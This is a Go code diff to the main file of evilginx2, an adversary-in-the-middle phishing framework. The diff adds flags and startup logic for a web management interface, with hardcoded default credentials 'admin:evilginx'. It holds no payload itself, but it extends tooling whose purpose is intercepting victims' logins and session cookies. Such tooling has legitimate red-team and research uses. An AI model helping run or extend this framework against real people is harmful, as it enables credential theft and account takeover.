@@ -8,6 +8,7 @@ import (
 	"os/user"
 	"path/filepath"
 	"regexp"
+	"strings"
 
 	"github.com/caddyserver/certmagic"
 	"github.com/kgretzky/evilginx2/core"
@@ -24,6 +25,11 @@ var debug_log = flag.Bool("debug", false, "Enable debug output")
 var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
 var cfg_dir = flag.String("c", "", "Configuration directory path")
 var version_flag = flag.Bool("v", false, "Show version")
+
+var web_enabled = flag.Bool("web", false, "Enable the Web UI")
+var web_host = flag.String("web-host", "127.0.0.1", "Host for the Web UI")
+var web_port = flag.Int("web-port", 8080, "Port for the Web UI")
+var web_auth = flag.String("web-auth", "admin:evilginx", "Basic Auth credentials for Web UI (user:pass)")
 
 func joinPath(base_path string, rel_path string) string {
 	var ret string
@@ -181,6 +187,27 @@ func main() {
 
 	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode)
 	hp.Start()
+
+	if *web_enabled {
+		if *web_auth == "" {
+			log.Fatal("you must provide --web-auth user:password for the Web UI")
+			return
+		}
+		parts := strings.SplitN(*web_auth, ":", 2)
+		if len(parts) != 2 {
+			log.Fatal("invalid --web-auth format. use user:password")
+			return
+		}
+		wui, err := core.NewWebUI(cfg, db, hp, crt_db, parts[0], parts[1], *web_host, *web_port)
+		if err != nil {
+			log.Fatal("webui: %v", err)
+			return
+		}
+		if *web_auth == "admin:evilginx" {
+			log.Warning("Web UI using default credentials: admin:evilginx")
+		}
+		wui.Start()
+	}
 
 	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
 	if err != nil {
